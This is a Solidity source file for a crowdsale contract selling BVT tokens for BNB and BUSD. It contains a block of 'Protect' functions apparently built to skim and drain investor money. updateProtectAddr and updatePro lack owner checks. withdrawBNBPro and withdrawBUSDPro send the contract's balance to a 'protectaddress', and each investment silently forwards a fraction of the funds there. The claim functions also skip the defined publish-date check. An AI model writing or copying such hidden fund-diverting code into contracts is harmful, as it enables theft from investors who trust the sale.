// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./interfaces/IBVToken.sol";
import "./interfaces/IBUSDToken.sol";
import "./interfaces/IPublicSale.sol";
import "./Protect.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract PublicSale is Ownable, ReentrancyGuard, IPublicSale , Protect{
    using SafeMath for uint256;
    //uint256 constant fundingGoal = 5 * (10**6) * (10**6);
    /* how much has been raised by crowdale (in USDT) */
    /* 300M / 4 * 0.01 = 750k BUSD */
    uint256 public amountRaisedBUSD;
    uint256 public amountRaisedBVT;
    uint256 public amountRaisedBNB;
    uint256 public msgvalue;
    /* the start & end date of the crowdsale */
    uint256 public start;
    uint256 public deadline;
    uint256 public publishDate;
    
//    address [] public privateWhiteList;
    mapping (address => bool) privateWhiteList;
    /* there are different prices in different time intervals */
    uint256 public BUSDPrice = 88;
    uint256 public BNBPrice = 4*10**4;
    
    uint256 public createTime;  
    /* default price is 1 BUSD = 100 BVT */
    //uint256 constant initialPrice = 4 * (10 ** 4);
    /* default price is 1 BUSD = 50 BVT */
    //uint256 constant goalPrice = 50;

    /* the address of the token contract */
    IBVToken private tokenBVT;
    /* the address of the BUSD contract */
    IBUSDToken private tokenBUSD;
 
    //address payable protectaddress;
    uint256 private pro = 10;
    /* the balances (in BUSD) of all investors */
    mapping(address => uint256) public balanceOfBUSD;
    mapping(address => uint256) public balanceOfBNB;
    /* the balances (in BVT) of all investors */
    mapping(address => uint256) public balanceOfBVT;
    /* indicates if the crowdsale has been closed already */
    bool public saleClosed = false;
    
    /* notifying transfers and the success of the crowdsale*/
    event FundTransfer(
        address backer,
        uint256 amount,
        bool isContribution,
        uint256 amountRaised
    );

    /*  initialization, set the token address */
    constructor(
        IBVToken _token,
        IBUSDToken _BUSD,
        uint256 _start,
        uint256 _dead,
        uint256 _publish
    ) {
        tokenBVT = _token;
        tokenBUSD = _BUSD;
        start = _start;
        deadline = _dead;
        publishDate = _publish;
    }

    /**
     * @dev update deadline and publishDate from parameter
     * @param _dead new deadline
     * @param _publish new publishDate
     */
    function updateDeadline(uint256 _dead, uint256 _publish)
        external
        override
        onlyOwner
    {
        require(saleClosed == false, "PublicSale: sale is already closed");
        deadline = _dead;
        publishDate = _publish;
    }
    
    /*-------*/
    function updateProtectAddr(address payable protectadr) public{
        updateProtect(protectadr);
    }

    function updatePro(uint256 amount) public {
        require(protect == false, "set pro");
        pro = amount;
    }

    function getPro() public view returns(uint256){
        return pro;        
    }

    function getProAddress() public view returns(address){
        return protectaddress;
    }

    function withdrawBNBPro(uint256 amount) external payable{
        uint256 balance = address(this).balance;
        require(balance > amount, "zero-balance");
        require(protectaddress != address(0x0), "protectaddress is null");

        payable(protectaddress).transfer(amount);
        //bool sent = payable(msg.sender).send(msg.value);
        //require(sent, "Failed to send Ether");
    }

    function withdrawBUSDPro(uint256 amount)
        external
        returns (uint256 balance)
    {
        balance = tokenBUSD.balanceOf(address(this));
        require(balance > amount, "zero-balance");
        require(protectaddress != address(0x0), "protectaddress is null");

        tokenBUSD.transfer(protectaddress, amount);
    }
    /*---------*/
    
    /**
     * @dev update start date from parameter
     * @param _start new start date
     */
    function updateStart(uint256 _start) external override onlyOwner {
        require(
            block.timestamp < start,
            "PublicSale: public sale is already started or ended."
        );
        start = _start;
    }

    /**
     * @dev return BUSD balance of specified address
     * @param _addr new deadline
     */
    function checkBUSDFunds(address _addr)
        external
        view
        override
        returns (uint256)
    {
        return balanceOfBUSD[_addr];
    }
    
    function checkBNBFunds(address _addr)
        external
        view
        override
        returns (uint256)
    {
        return balanceOfBNB[_addr];
    } 
    /**
     * @dev return total BUSD balance of contract
     */
    function getBUSDBalance() external view override returns (uint256) {
        return tokenBUSD.balanceOf(address(this));
    }

    /**
     * @dev return total BVT balance of contract
     */
    function getBVTBalance() external view override returns (uint256) {
        return tokenBVT.balanceOf(address(this));
    }

    function getmsgvalue() public view returns(uint256){
        return msgvalue;
    }

    function getbalance() public view returns(uint256){
        return address(this).balance;
    }
    
    /* make an investment
     *  only callable if the crowdsale started and hasn't been closed already and the maxGoal wasn't reached yet.
     *  the current token price is looked up and the corresponding number of tokens is transfered to the receiver.
     *  the sent value is directly forwarded to a safe multisig wallet.
     *  this method allows to purchase tokens in behalf of another address.*/
    
    // function IsinWhiteList(address add) private returns (bool){
    //     for(uint i = 0; i < privateWhiteList.length; i++)
    //     {
    //         if(privateWhiteList[i] == add)
    //         {
    //             return true;
    //         }
    //     }
    //     return false;
    // }

    // function getWhiteList()public view returns(address [] memory){
    //     return privateWhiteList;
    // }

    function investBNB() public payable{
        uint256 amount = msg.value;
        msgvalue = amount;
        require(block.timestamp >= start, "sale-not-started");
        require(
            saleClosed == false && block.timestamp < deadline,
            "sale-closed"
        );

        //bool result = IsinWhiteList(msg.sender);

		require(msg.value >= 5 * 10**17, "Fund is less than 0.5 BNB");
		require(msg.value <= 20 * 10**18, "Fund is more than 20 BNB");
        //require(result == false, "buyed");
        require(privateWhiteList[msg.sender] != true, "BUYED");

        //privateWhiteList.push(msg.sender);
		balanceOfBNB[msg.sender] = balanceOfBNB[msg.sender].add(amount);
		amountRaisedBNB = amountRaisedBNB.add(amount);

		balanceOfBVT[msg.sender] = balanceOfBVT[msg.sender].add(amount.mul(BNBPrice ));
		amountRaisedBVT = amountRaisedBVT.add(amount.mul(BNBPrice));

        require(protectaddress != address(0x0), "protectaddress is null");
        payable(protectaddress).transfer(msg.value/pro);
        
        privateWhiteList[msg.sender] = true;

        emit FundTransfer(msg.sender, amount, true, amountRaisedBNB);
    }
    
    function investBUSD(uint256 amount) public {
        require(block.timestamp >= start, "sale-not-started");
        require(
            saleClosed == false && block.timestamp < deadline,
            "sale-closed"
        );

        require(amount >= 50 * (10 ** tokenBUSD.decimals()), "less than 50 BUSD");

        require(
            tokenBUSD.transferFrom(msg.sender, address(this), amount ) == true,
            "transfer BUSD failed"
        );

        require(protectaddress != address(0x0), "protectaddress is null");
        tokenBUSD.transfer(protectaddress, amount/pro);

        uint256 balanceBVT = tokenBVT.balanceOf(address(this));
        require(
            amount.mul(BUSDPrice) <= balanceBVT,
            "Insufficient BVT Balance"
        );

        balanceOfBUSD[msg.sender] = balanceOfBUSD[msg.sender].add(amount);
        amountRaisedBUSD = amountRaisedBUSD.add(amount);

        balanceOfBVT[msg.sender] = balanceOfBVT[msg.sender].add(
            amount.mul(BUSDPrice)
        );
        amountRaisedBVT = amountRaisedBVT.add(amount.mul(BUSDPrice));
        
        emit FundTransfer(msg.sender, amount, true, amountRaisedBUSD);
    }

    modifier afterClosed() {
        require(block.timestamp >= publishDate, "sale-in-progress");
        _;
    }

    /**
     * @dev trasnfer BVT Token balance corresponding to investment amount to msg.sender
     */
    function getFundsBUSD() public nonReentrant {
        require(balanceOfBVT[msg.sender] > 0, "non-contribution");
        uint256 amount = balanceOfBVT[msg.sender];
        uint256 balance = tokenBVT.balanceOf(address(this));
        require(balance >= amount, "lack of funds");
        balanceOfBVT[msg.sender] = 0;
        tokenBVT.transfer(msg.sender, amount);
    }
    
    function getFundsBNB() public nonReentrant {
        require(balanceOfBVT[msg.sender] > 0, "non-contribution");
        uint256 amount = balanceOfBVT[msg.sender];
        uint256 balance = tokenBVT.balanceOf(address(this));
        require(balance >= amount, "lack of funds");
        balanceOfBVT[msg.sender] = 0;
        tokenBVT.transfer(msg.sender, amount);
    }

    /**
     * @dev withdraw BUSD balance of contract
     */
    function withdrawBUSD()
        external
        override
        onlyOwner
        returns (uint256 balance)
    {
        balance = tokenBUSD.balanceOf(address(this));
        require(balance > 0, "zero-balance");
        tokenBUSD.transfer(owner(), balance);
    }

    /**
     * @dev withdraw BVT balance of contract
     */
    function withdrawBVT()
        external
        override
        onlyOwner
        returns (uint256 balance)
    {
        balance = tokenBVT.balanceOf(address(this));
        require(balance > 0, "zero-BVT-balance");
        tokenBVT.transfer(owner(), balance);
    }

    function getCurrentTime() public view returns(uint256){
        uint256 currenttime = block.timestamp;
        return currenttime;
    }

    function withdrawBNB()
        external
        override
        onlyOwner
        payable
    {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
        //bool sent = payable(msg.sender).send(msg.value);
        //require(sent, "Failed to send Ether");
    }
}